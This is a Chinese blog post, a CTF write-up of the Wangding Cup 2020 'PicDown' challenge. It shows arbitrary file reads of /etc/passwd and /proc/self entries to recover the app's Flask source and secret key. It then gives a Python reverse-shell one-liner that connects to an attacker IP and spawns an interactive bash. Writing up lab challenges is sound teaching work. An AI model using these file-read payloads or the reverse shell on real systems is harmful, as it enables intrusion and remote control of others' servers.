@@ -1,0 +1,236 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>网鼎杯2020白虎组-PicDown | Seizer</title><meta name="keywords" content="刷题记录"><meta name="author" content="Seizer"><meta name="copyright" content="Seizer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="任意文件读取及Linux进程查看python脚本反弹shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯2020白虎组-PicDown">
+<meta property="og:url" content="https://seizer-zyx.github.io/post/2021-12/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84]PicDown/index.html">
+<meta property="og:site_name" content="Seizer">
+<meta property="og:description" content="任意文件读取及Linux进程查看python脚本反弹shell">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/seizer-zyx/picgo/raw/master/background/202112062028562.jpeg">
+<meta property="article:published_time" content="2021-12-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-07T11:51:26.874Z">
+<meta property="article:author" content="Seizer">
+<meta property="article:tag" content="刷题记录">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/seizer-zyx/picgo/raw/master/background/202112062028562.jpeg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://seizer-zyx.github.io/post/2021-12/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84]PicDown/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '网鼎杯2020白虎组-PicDown',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-07 19:51:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/transparent.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Seizer</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">网鼎杯2020白虎组-PicDown</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-12-06T16:00:00.000Z" title="undefined 2021-12-07 00:00:00">2021-12-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="网鼎杯2020白虎组-PicDown"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h1><p><strong>考点：1、任意文件读取及Linux进程查看    2、python脚本反弹shell</strong></p>
+<p>进去之后在输入处随便输个啥，发现url有参数，猜测ssrf</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=http:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357980.png" alt="image-20211207125206946"></p>
+<p>返回了请求值，使用<code>file</code>协议无果，就试了一下直接读取文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357981.png" alt="image-20211207125326165"></p>
+<p>读取成功，存在<code>任意文件读取</code></p>
+<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>尝试直接读取<code>/flag</code></p>
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357982.png" alt="image-20211207125439037"></p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>尝试读取用于当前进程的启动命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=/proc/self/cmdline</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357983.png" alt="image-20211207125812325"></p>
+<p>接下来读取<code>app.py</code>，获得源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+<p>从路由<code>/no_one_know_the_manager</code>可以看到，如果获得了<code>SECRET_KEY</code>就可以获得shell了。读取<code>/proc/self/fd/3</code></p>
+<p>重点：这里打开了文件并没有关闭，这里就是漏洞利用点！！！fd目录下保存的文件都是以数字存储的，我们使用爆破可知在<code>3</code>处有数据</p>
+<blockquote>
+<p>/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paeg?url=/proc/self/fd/<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357984.png" alt="image-20211207130233789"></p>
+<p>至此获得了<code>SECRET_KEY</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=lIZatnx0S3HWqem013h0YpU6cXK30sQRPwKEZr4e6FU=&amp;shell=ls</span><br></pre></td></tr></table></figure>
+
+<p>但是发现shell执行的命令并不会返回结果，所以使用反弹shell</p>
+<p>这里直接使用python脚本反弹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;IP&#x27;,端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将该payload进行url全编码后即可成功反弹</p>
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357985.png" alt="image-20211207132702535"></p>
+<p>这里我还专门看了一下<code>search.html</code>的内容，就说为什么我使用<code>file协议</code>并没有回显<code>HACK ERROR!</code>。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Seizer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://seizer-zyx.github.io/post/2021-12/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84]PicDown/">https://seizer-zyx.github.io/post/2021-12/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84]PicDown/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://seizer-zyx.github.io" target="_blank">Seizer</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/seizer-zyx/picgo/raw/master/background/202112062028562.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/2021-12/DNUICTF/"><img class="next-cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112071954629.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DNUICTF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/2021-04/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/" title="WUSTCTF2020-朴实无华"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/background/202112062028562.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-20</div><div class="title">WUSTCTF2020-朴实无华</div></div></a></div><div><a href="/post/2021-05/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_serialize_php/" title="安洵杯2019-easy_serialize_php"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/background/202112062028562.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-13</div><div class="title">安洵杯2019-easy_serialize_php</div></div></a></div><div><a href="/post/2021-06/%5BMRCTF2020%5DEzpop/" title="MRCTF2020-Ezpop"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/background/202112062028562.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-12</div><div class="title">MRCTF2020-Ezpop</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown"><span class="toc-number">1.</span> <span class="toc-text">[网鼎杯 2020 白虎组]PicDown</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">非预期解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">预期解</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Seizer</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.16/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-gitee-calendar-api.vercel.app/api?seizer-zyx";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="seizer-zyx";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style>undefined</style><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/theme_f/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
